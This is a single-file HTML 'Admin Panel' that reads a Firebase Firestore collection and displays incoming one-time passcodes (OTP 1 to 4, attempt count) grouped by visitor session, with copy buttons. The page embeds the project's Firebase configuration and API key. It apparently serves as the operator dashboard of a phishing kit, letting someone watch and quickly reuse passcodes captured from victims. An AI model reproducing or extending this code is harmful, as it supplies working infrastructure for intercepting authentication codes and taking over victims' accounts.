<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>

<style>
body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; }
header { background:#007BFF; color:#fff; padding:15px; text-align:center; font-size:22px; }

.buttons { text-align:center; margin:10px; }
.buttons button {
  padding:8px 16px; margin:0 5px;
  border:none; border-radius:5px;
  background:#007BFF; color:#fff; cursor:pointer;
}
.buttons button.active { background:#0056b3; }

.container {
  max-width:1200px; margin:auto; padding:15px;
  height:80vh; overflow-y:auto;
}

.session-block {
  background:#fff; border:2px solid #28a745;
  border-radius:8px; padding:15px; margin-bottom:20px;
}

.session-title {
  font-weight:bold; font-size:18px; margin-bottom:10px;
}

.data-item {
  background:#f9f9f9; padding:10px; margin-bottom:10px;
  border-radius:5px;
}

.field {
  display:flex; align-items:center; gap:5px; margin-bottom:5px;
}
.field-name { width:90px; font-weight:bold; }
.field-value { flex:1; }

.copy-btn {
  padding:3px 8px; border:none; border-radius:5px;
  background:#28a745; color:#fff; cursor:pointer;
}

.otp-field .field-value {
  color:#d63384; font-weight:bold;
}

small { color:gray; font-size:12px; }
</style>
</head>

<body>

<header>Admin Panel</header>

<div class="buttons">
  <button id="allBtn" class="active">All Data</button>
  <button id="groupBtn">Grouped</button>
</div>

<div class="container" id="dataContainer"></div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
import { getFirestore, collection, query, orderBy, onSnapshot }
from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
  authDomain: "ss22-a96d3.firebaseapp.com",
  projectId: "ss22-a96d3",
  storageBucket: "ss22-a96d3.firebasestorage.app",
  messagingSenderId: "607942972170",
  appId: "1:607942972170:web:2e38b2d5410ff37f3960f3"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const container = document.getElementById("dataContainer");

let allData = [];
let view = "all";
let sessionMap = {};
let nextSessionNo = 1;

const fieldMap = {
  otp1: "OTP 1",
  otp2: "OTP 2",
  otp3: "OTP 3",
  otp4: "OTP 4",
  attempt: "Attempt"
};

// ðŸ”¥ READ ONLY opt1 COLLECTION
const q = query(collection(db, "opt1"), orderBy("timestamp", "desc"));
onSnapshot(q, snap => {
  allData = [];
  snap.forEach(doc => {
    const d = doc.data();
    d.id = doc.id;
    allData.push(d);

    const sid = d.sessionId || "Unknown";
    if (!sessionMap[sid]) sessionMap[sid] = nextSessionNo++;
  });
  render();
});

function render() {
  if (view === "all") renderAll();
  else renderGrouped();
}

function renderAll() {
  container.innerHTML = "";
  allData.forEach(item => {
    container.appendChild(buildItem(item));
  });
}

function renderGrouped() {
  container.innerHTML = "";
  const grouped = {};

  allData.forEach(i => {
    const sid = i.sessionId || "Unknown";
    if (!grouped[sid]) grouped[sid] = [];
    grouped[sid].push(i);
  });

  Object.keys(grouped).forEach(sid => {
    const box = document.createElement("div");
    box.className = "session-block";

    const title = document.createElement("div");
    title.className = "session-title";
    title.textContent = `Session ${sessionMap[sid]} - ${sid}`;
    box.appendChild(title);

    grouped[sid].forEach(i => box.appendChild(buildItem(i)));
    container.appendChild(box);
  });
}

function buildItem(item) {
  const div = document.createElement("div");
  div.className = "data-item";

  Object.keys(fieldMap).forEach(key => {
    if (!item[key]) return;

    const row = document.createElement("div");
    row.className = "field";
    if (key.startsWith("otp")) row.classList.add("otp-field");

    row.innerHTML = `
      <div class="field-name">${fieldMap[key]}:</div>
      <div class="field-value">${item[key]}</div>
      <button class="copy-btn">Copy</button>
    `;

    row.querySelector("button").onclick = () =>
      navigator.clipboard.writeText(item[key]);

    div.appendChild(row);
  });

  if (item.timestamp) {
    const t = document.createElement("small");
    t.textContent = new Date(item.timestamp.seconds * 1000).toLocaleString();
    div.appendChild(t);
  }

  return div;
}

document.getElementById("allBtn").onclick = () => {
  view = "all";
  allBtn.classList.add("active");
  groupBtn.classList.remove("active");
  render();
};

document.getElementById("groupBtn").onclick = () => {
  view = "group";
  groupBtn.classList.add("active");
  allBtn.classList.remove("active");
  render();
};
</script>

</body>
</html>